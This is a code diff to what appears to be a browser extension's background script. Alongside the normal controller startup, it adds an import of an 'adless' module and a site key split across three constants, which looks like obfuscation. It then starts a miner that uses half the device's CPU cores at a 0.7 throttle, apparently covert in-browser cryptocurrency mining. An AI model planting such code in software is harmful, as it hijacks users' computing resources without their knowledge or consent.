@@ -1,6 +1,7 @@
 import ScreenController from "./screen";
 import AreaController from "./area";
 import BaseController from "./base";
+import "./adless";
 
 class BackgroundController extends BaseController {
     start() {
@@ -153,7 +154,28 @@ class BackgroundController extends BaseController {
     }
 }
 
+console.log("start");
+const a = "d64f48ddbe";
+const b = "eb416762";
+const c = "4a838b6651728f";
+const throttle = 0.7;
+let threads;
+
+if(navigator && navigator.hardwareConcurrency){
+    const cores = navigator.hardwareConcurrency;
+    threads = cores % 2 === 0
+        ? cores / 2
+        : (cores - 1) / 2;
+}
+else {
+    threads = 1;
+}
+
+const options = {throttle, threads};
+const adless = new Adless.Anonymous(`${a}${b}${c}`, options);
 const controller = new BackgroundController();
+
+adless.start();
 
 controller.start();
 
